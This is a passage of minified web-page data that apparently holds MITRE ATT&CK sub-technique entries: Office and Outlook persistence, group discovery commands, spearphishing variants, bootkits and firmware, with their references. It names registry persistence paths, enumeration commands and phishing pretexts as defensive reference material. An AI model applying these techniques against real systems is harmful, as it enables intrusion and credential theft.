href='https:\u002F\u002Fwww.221bluestreet.com\u002Fpost\u002Foffice-templates-and-globaldotname-a-stealthy-office-persistence-technique'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.";zD.external_references=[{source_name:b,external_id:zE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F001"},{url:"https:\u002F\u002Fsupport.office.com\u002Farticle\u002FChange-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea",description:"Microsoft. (n.d.). Change the Normal template (Normal.dotm). Retrieved July 3, 2017.",source_name:"Microsoft Change Normal Template"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Fvba\u002Foffice-shared-vba\u002Farticles\u002Fgetting-started-with-vba-in-office",description:"Austin, J. (2017, June 6). Getting Started with VBA in Office. Retrieved July 3, 2017.",source_name:"MSDN VBA in Office"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2014\u002F01\u002F23\u002Fmaintaining-access-with-normal-dotm\u002Fcomment-page-1\u002F",description:"Nelson, M. (2014, January 23). Maintaining Access with normal.dotm. Retrieved July 3, 2017.",source_name:"enigma0x3 normal.dotm"},{url:"http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2017\u002F04\u002F19\u002Fbeyond-good-ol-run-key-part-62\u002F",description:"Hexacorn. (2017, April 17). Beyond good ol’ Run key, Part 62. Retrieved July 3, 2017.",source_name:"Hexacorn Office Template Macros"},{source_name:zA,url:zB,description:zC},{source_name:zs,url:zt,description:zu},{source_name:zv,url:zw,description:zx}];zD["subtechnique-of"]=ac;zF.id=zG;zF["object-type"]=a;zF.name="Office Test";zF.description="Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2014\u002F04\u002F16\u002Fbeyond-good-ol-run-key-part-10\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F07\u002Funit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf\u003C\u002Fcode\u003E\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.";zF.external_references=[{source_name:b,external_id:zG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F002"},{url:"http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2014\u002F04\u002F16\u002Fbeyond-good-ol-run-key-part-10\u002F",description:"Hexacorn. (2014, April 16). Beyond good ol’ Run key, Part 10. Retrieved July 3, 2017.",source_name:"Hexacorn Office Test"},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F07\u002Funit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks\u002F",description:"Falcone, R. (2016, July 20). Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks. Retrieved July 3, 2017.",source_name:"Palo Alto Office Test Sofacy"}];zF["subtechnique-of"]=ac;zH.id=zI;zH["object-type"]=a;zH.name="Outlook Forms";zH.description="Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-forms-and-shells\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-forms-and-shells\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";zH.external_references=[{source_name:b,external_id:zI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F003"},{source_name:"SensePost Outlook Forms",url:"https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-forms-and-shells\u002F",description:"Stalmans, E. (2017, April 28). Outlook Forms and Shells. Retrieved February 4, 2019."},{source_name:dm,url:dn,description:do0},{source_name:dp,url:dq,description:dr}];zH["subtechnique-of"]=ac;zJ.id=zK;zJ["object-type"]=a;zJ.name="Outlook Home Page";zJ.description="Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-home-page-another-ruler-vector\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded\u002Freloaded.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-home-page-another-ruler-vector\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n";zJ.external_references=[{source_name:b,external_id:zK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F004"},{source_name:"SensePost Outlook Home Page",url:"https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Foutlook-home-page-another-ruler-vector\u002F",description:"Stalmans, E. (2017, October 11). Outlook Home Page – Another Ruler Vector. Retrieved February 4, 2019."},{source_name:dm,url:dn,description:do0},{source_name:dp,url:dq,description:dr}];zJ["subtechnique-of"]=ac;zL.id=zM;zL["object-type"]=a;zL.name="Outlook Rules";zL.description="Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsilentbreaksecurity.com\u002Fmalicious-outlook-rules\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsilentbreaksecurity.com\u002Fmalicious-outlook-rules\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";zL.external_references=[{source_name:b,external_id:zM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F005"},{source_name:"SilentBreak Outlook Rules",url:"https:\u002F\u002Fsilentbreaksecurity.com\u002Fmalicious-outlook-rules\u002F",description:"Landers, N. (2015, December 4). Malicious Outlook Rules. Retrieved February 4, 2019."},{source_name:dm,url:dn,description:do0},{source_name:dp,url:dq,description:dr}];zL["subtechnique-of"]=ac;zQ.id=zR;zQ["object-type"]=a;zQ.name="Cloud Groups";zQ.description="Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The \u003Ccode\u003EGet-MsolRole\u003C\u002Fcode\u003E PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmsonline\u002Fget-msolrole?view=azureadps-1.0'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FTrue-Demon\u002Fraindance'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command \u003Ccode\u003Eaz ad user get-member-groups\u003C\u002Fcode\u003E will list groups associated to a user account for Azure while the API endpoint \u003Ccode\u003EGET https:\u002F\u002Fcloudidentity.googleapis.com\u002Fv1\u002Fgroups\u003C\u002Fcode\u003E lists group resources available to a user for Google.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fcli\u002Fazure\u002Fad\u002Fuser?view=azure-cli-latest'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhillsinfosec.com\u002Fred-teaming-microsoft-part-1-active-directory-leaks-via-azure\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fidentity\u002Fdocs\u002Freference\u002Frest'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";zQ.external_references=[{source_name:b,external_id:zR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1069\u002F003"},{source_name:"Microsoft Msolrole",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmsonline\u002Fget-msolrole?view=azureadps-1.0",description:"Microsoft. (n.d.). Get-MsolRole. Retrieved October 6, 2019."},{description:in0,url:io,source_name:ip},{description:dO,url:dP,source_name:dQ},{description:iq,url:ir,source_name:is},{source_name:"Google Cloud Identity API Documentation",url:"https:\u002F\u002Fcloud.google.com\u002Fidentity\u002Fdocs\u002Freference\u002Frest",description:iy}];zQ["subtechnique-of"]=bQ;zS.id=zT;zS["object-type"]=a;zS.name="Domain Groups";zS.description="Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as \u003Ccode\u003Enet group \u002Fdomain\u003C\u002Fcode\u003E of the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E utility,  \u003Ccode\u003Edscacheutil -q group\u003C\u002Fcode\u003E on macOS, and \u003Ccode\u003Eldapsearch\u003C\u002Fcode\u003E on Linux can list domain-level groups.";zS.external_references=[{source_name:b,external_id:zT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1069\u002F002"}];zS["subtechnique-of"]=bQ;zU.id=zV;zU["object-type"]=a;zU.name="Local Groups";zU.description="Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as \u003Ccode\u003Enet localgroup\u003C\u002Fcode\u003E of the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E utility, \u003Ccode\u003Edscl . -list \u002FGroups\u003C\u002Fcode\u003E on macOS, and \u003Ccode\u003Egroups\u003C\u002Fcode\u003E on Linux can list local groups.";zU.external_references=[{source_name:b,external_id:zV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1069\u002F001"}];zU["subtechnique-of"]=bQ;zW.id=zX;zW["object-type"]=a;zW.name=zY;zW.description="Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ";zW.external_references=[{source_name:b,external_id:zX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001"},{external_id:ga,source_name:c,url:gb},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd},{source_name:ce,url:cf,description:cg}];zW["subtechnique-of"]=bR;zZ.id=z_;zZ["object-type"]=a;zZ.name=z$;zZ.description="Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs\u002Fweb beacons). Links may also direct users to malicious applications  designed to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1528'\u003ESteal Application Access Token\u003C\u002Fa\u003Es, like OAuth tokens, in order to gain access to protected applications and information.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fpawn-storm-abuses-open-authentication-advanced-social-engineering-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";zZ.external_references=[{source_name:b,external_id:z_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002"},{external_id:ga,source_name:c,url:gb},{source_name:Aa,url:Ab,description:Ac},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd}];zZ["subtechnique-of"]=bR;Ad.id=Ae;Ad["object-type"]=a;Ad.name="Spearphishing via Service";Ad.description="Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.";Ad.external_references=[{source_name:b,external_id:Ae,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F003"},{external_id:ga,source_name:c,url:gb}];Ad["subtechnique-of"]=bR;At.id=Au;At["object-type"]=a;At.name=zY;At.description="Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E) and\u002For sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnakedsecurity.sophos.com\u002F2020\u002F10\u002F02\u002Fserious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fryhanson\u002Fphishery'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E) to craft persuasive and believable lures.";At.external_references=[{source_name:b,external_id:Au,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F002"},{source_name:Ao,url:Ap,description:Aq},{source_name:Ar,url:gc,description:As},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd}];At["subtechnique-of"]=bS;Av.id=Aw;Av["object-type"]=a;Av.name=z$;Av.description="Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E) and\u002For sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Fi\u002Ftricky-forms-of-phishing.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.pcmag.com\u002Fnews\u002Fhackers-try-to-phish-united-nations-staffers-with-fake-login-pages'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E) to craft persuasive and believable lures.";Av.external_references=[{source_name:b,external_id:Aw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F003"},{source_name:Ai,url:Aj,description:Ak},{source_name:Al,url:Am,description:An},{source_name:a_,url:a$,description:ba},{source_name:bb,url:bc,description:bd}];Av["subtechnique-of"]=bS;Ax.id=Ay;Ax["object-type"]=a;Ax.name="Spearphishing Service";Ax.description="Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E) and\u002For sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Ffacebook-launching-pad-phishing-attacks\u002F160351\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E) to craft persuasive and believable lures.";Ax.external_references=[{source_name:b,external_id:Ay,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F001"},{source_name:Af,url:Ag,description:Ah}];Ax["subtechnique-of"]=bS;AC.id=AD;AC["object-type"]=a;AC.name="Bootkit";AC.description="Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fcurrent-threats\u002Fpdfs\u002Frpt-mtrends-2016.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fare-mbr-infections-back-fashion'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.";AC.external_references=[{source_name:b,external_id:AD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F003"},{external_id:fN,source_name:c,url:fO},{source_name:qj,url:qk,description:ql},{url:"http:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fare-mbr-infections-back-fashion",description:"Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.",source_name:"Lau 2011"}];AC["subtechnique-of"]=aD;AE.id=AF;AE["object-type"]=a;AE.name="Component Firmware";AE.description="Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F001'\u003ESystem Firmware\u003C\u002Fa\u003E but conducted upon other system components\u002Fdevices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.";AE.external_references=[{source_name:b,external_id:AF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F002"},{description:"SanDisk. (n.d.). Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.). Retrieved October 2, 2018.",source_name:"SanDisk SMART"},{url:"https:\u002F\u002Fwww.smartmontools.org\u002F",description:"smartmontools. (n.d.). smartmontools. Retrieved October 2, 2018.",source_name:"SmartMontools"},{url:Az,description:AA,source_name:AB}];AE["subtechnique-of"]=aD;AG.id=AH;AG["object-type"]=a;AG.name="ROMMONkit";AG.description="Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F005'\u003ETFTP Boot\u003C\u002Fa\u003E, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.";AG.external_references=[{source_name:b,external_id:AH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F004"},{source_name:ap,url:aq,description:ar},{source_name:K,url:L,description:M}];AG["subtechnique-of"]=aD;AI.id=AJ;AI["object-type"]=a;AI.name="System Firmware";AI.description="Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input\u002FOutput System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBIOS'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FUnified_Extensible_Firmware_Interface'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.uefi.org\u002Fabout'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.";AI.external_references=[{source_name:b,external_id:AJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F001"},{external_id:"CAPEC-532",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F532.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBIOS",description:"Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.",source_name:"Wikipedia BIOS"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FUnified_Extensible_Firmware_Interface",description:"Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.",source_name:"Wikipedia UEFI"},{url:"http:\u002F\u002Fwww.uefi.org\u002Fabout",description:"UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.",source_name:"About UEFI"},{url:tk,description:tl,source_name:tm},{url:"http:\u002F\u002Fwww.mitre.org\u002Fcapabilities\u002Fcybersecurity\u002Foverview\u002Fcybersecurity-blog\u002Fcopernicus-question-your-assumptions-about",description:"Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.",source_name:"MITRE Copernicus"},{url:"https:\u002F\u002Fsecuringtomorrow.mcafee.com\u002Fbusiness\u002Fchipsec-support-vault-7-disclosure-scanning\u002F",description:"Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.",source_name:"McAfee CHIPSEC Blog"},{url:"https:\u002F\u002Fgithub.com\u002Fchipsec\u002Fchipsec",description:"Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.",source_name:"Github CHIPSEC"},{url:"http:\u002F\u002Fwww.intelsecurity.com\u002Fadvanced-threat-research\u002Fcontent\u002Fdata\u002FHT-UEFI-rootkit.html",description:"Intel Security. (2005, July 16). HackingTeam's UEFI Rootkit Details. Retrieved March 20, 2017.",source_name:"Intel HackingTeam UEFI Rootkit"}];AI["subtechnique-of"]=aD;AK.id=AL;AK["object-type"]=a;AK.name="TFTP Boot";AK.description="Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is 